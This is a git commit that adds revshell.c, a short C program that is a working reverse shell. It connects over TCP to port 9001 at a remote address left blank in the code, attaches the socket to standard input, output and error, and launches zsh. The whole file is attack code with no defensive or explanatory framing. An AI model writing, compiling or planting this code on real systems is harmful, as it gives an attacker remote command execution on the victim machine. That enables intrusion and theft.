d98e194ccf41f76035bf0d339e71721730e5b6a6
Aftermath-1 <59237021+Aftermath-1@users.noreply.github.com>
2024-06-11 02:11:31 +0200

    Create revshell.c

---
+++ revshell.c
@@ -0,0 +1,31 @@
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+int main(void){
+    int port = 9001;
+    struct sockaddr_in revsockaddr;
+
+    int sockt = socket(AF_INET, SOCK_STREAM, 0);
+    revsockaddr.sin_family = AF_INET;       
+    revsockaddr.sin_port = htons(port);
+    revsockaddr.sin_addr.s_addr = inet_addr("");
+
+    connect(sockt, (struct sockaddr *) &revsockaddr, 
+    sizeof(revsockaddr));
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+
+    char * const argv[] = {"zsh", NULL};
+    execvp("/usr/bin/zsh", argv);
+
+    return 0;       
+}
+
+
+
+
